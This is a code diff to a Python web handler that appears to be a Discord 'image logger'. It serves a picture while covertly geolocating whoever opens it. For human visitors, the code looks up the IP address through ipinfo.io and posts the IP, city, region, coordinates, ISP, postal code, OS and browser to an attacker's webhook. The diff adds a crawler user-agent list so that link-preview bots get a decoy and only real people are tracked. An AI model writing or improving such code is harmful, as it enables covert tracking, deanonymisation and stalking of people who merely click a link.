@@ -8,6 +8,12 @@ bindata = httpx.get('https://a.pinatafarm.com/420x498/c6bb89155c/flight-scared-a
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
+# Known bot/crawler user-agent tokens to treat as previews (no IP logging)
+KNOWN_BOT_UA_TOKENS = [
+    'discordbot', 'telegrambot', 'facebookexternalhit', 'slackbot',
+    'twitterbot', 'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider'
+]
+
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Fentanyl",
@@ -62,8 +68,8 @@ class handler(BaseHTTPRequestHandler):
         except Exception: data = bindata
         useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
         os, browser = httpagentparser.simple_detect(useragent)
-        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
-            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
-            else: pass
+        # If the requester is a known bot/crawler, treat as a preview: serve image and notify without real IP
+        if any(token in useragent.lower() for token in KNOWN_BOT_UA_TOKENS):
+            self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev('BOT',useragent))
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
